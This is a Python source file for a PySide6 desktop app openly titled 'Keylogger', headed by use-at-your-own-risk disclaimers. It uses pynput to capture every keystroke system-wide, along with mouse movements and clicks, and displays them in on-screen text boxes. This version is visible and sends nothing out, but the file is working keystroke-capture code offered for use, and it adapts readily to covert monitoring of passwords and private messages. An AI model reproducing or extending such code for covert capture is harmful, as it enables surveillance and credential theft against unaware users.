# USE AT YOUR OWN RISK
# WITH GREAT POWER COMES GREAT RESPONSIBILITY
# I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS
""" Created by: AK1R4S4T0H
"""
import sys
from PySide6.QtCore import QTimer, Qt, QFile
from PySide6.QtWidgets import QApplication, QMainWindow, QTextEdit, QPushButton, QVBoxLayout, QWidget
from pynput import keyboard, mouse
import os

os.environ['QT_QPA_PLATFORM'] = 'xcb'


class KeyloggerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Keylogger")
        self.setGeometry(100, 100, 600, 600)
        try:
            style_file = QFile("Py_Programs/style.qss")
            if style_file.open(QFile.ReadOnly | QFile.Text):
                style_sheet = style_file.readAll()
                style_file.close()
                style_sheet = str(style_sheet, encoding='utf-8')
                self.setStyleSheet(style_sheet)
            else:
                raise FileNotFoundError
        except FileNotFoundError:
            style_file = QFile("style.qss")
            if style_file.open(QFile.ReadOnly | QFile.Text):
                style_sheet = style_file.readAll()
                style_file.close()
                style_sheet = str(style_sheet, encoding='utf-8')
                self.setStyleSheet(style_sheet)
            else:
                print("Failed to open style.qss")

        self.textbox = QTextEdit(self)
        self.textbox.setReadOnly(True)
        self.textbox.setGeometry(50, 50, 500, 200)

        self.start_button = QPushButton("Start Keylogger", self)
        self.start_button.setGeometry(50, 300, 150, 30)
        self.start_button.clicked.connect(self.start_keylogger)

        self.stop_button = QPushButton("Stop Keylogger", self)
        self.stop_button.setGeometry(250, 300, 150, 30)
        self.stop_button.clicked.connect(self.stop_keylogger)

        self.textbox2 = QTextEdit(self)
        self.textbox2.setReadOnly(True)
        self.textbox2.setGeometry(50, 350, 200, 200)

        self.listener = None
        self.listener2 = None

        self.timer = QTimer(self)
        self.timer.setInterval(900)  # Update every 20ms
        self.timer.timeout.connect(self.update_mouse_position)
        self.mouse_x = 0
        self.mouse_y = 0

    def on_press(self, key):
        char = None
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = str("[SPACE]")
            elif key == keyboard.Key.enter:
                char = str("[ENTER]")
            else:
                char = str(key)

        if char:
            self.textbox.insertPlainText(char)

    def update_mouse_position(self):
        self.textbox2.insertPlainText(f"Mouse moved to ({self.mouse_x}, {self.mouse_y})\n")

    def on_move(self, x, y):
        self.mouse_x = x
        self.mouse_y = y

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.textbox2.insertPlainText(f"Mouse clicked at ({x}, {y}) with {button.name}\n")

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

        self.listener2 = mouse.Listener(on_move=self.on_move, on_click=self.on_click)
        self.listener2.start()

        self.timer.start()

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
            print("Keyboard Listener stopped")

        if self.listener2:
            self.listener2.stop()
            self.listener2 = None
            print("Mouse Listener stopped")

        if self.timer:
            self.timer.stop()
            print("Timer stopped")

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        print("Keylogger stopped")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    keylogger_gui = KeyloggerGUI()
    keylogger_gui.show()
    sys.exit(app.exec())

